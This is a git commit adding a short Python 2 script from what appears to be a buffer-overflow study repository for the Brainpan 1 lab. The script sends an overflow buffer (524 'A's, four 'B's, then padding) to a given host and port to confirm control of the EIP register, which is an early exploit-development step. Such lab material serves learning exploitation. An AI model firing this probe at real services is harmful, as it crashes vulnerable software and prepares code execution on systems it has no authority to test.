87d64c067f05f384e51913a5f3b1c5f492f1fc71
Johnny Chafla <91343759+hacknotes@users.noreply.github.com>
2021-10-09 15:00:00 -0500

    Create eipcontrol.py

---
+++ Buffer Overflow/Windows/Stack Based 32 Bits (Brainpan 1)/eipcontrol.py
@@ -0,0 +1,23 @@
+#!/usr/bin/python2
+#Johnny Chafla | @jch | @hacknotes
+#site https://hacknotes.github.io/
+
+import socket, sys
+
+if len(sys.argv) < 3:
+	print ("\n Usage: python " + sys.argv[0] + " <ip address> <port>\n")
+	sys.exit(0)
+
+ipADD = sys.argv[1]
+rPort = sys.argv[2]
+
+if __name__=='__main__':
+
+ # COMPROBACION del control del EIP
+ buffer = "A"*524 + "B"*4 + "C"*500
+
+ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+ s.connect((ipADD, int(rPort)))
+ miData = buffer + '\r\n'
+ s.send(miData)
+ data = s.recv(1024)
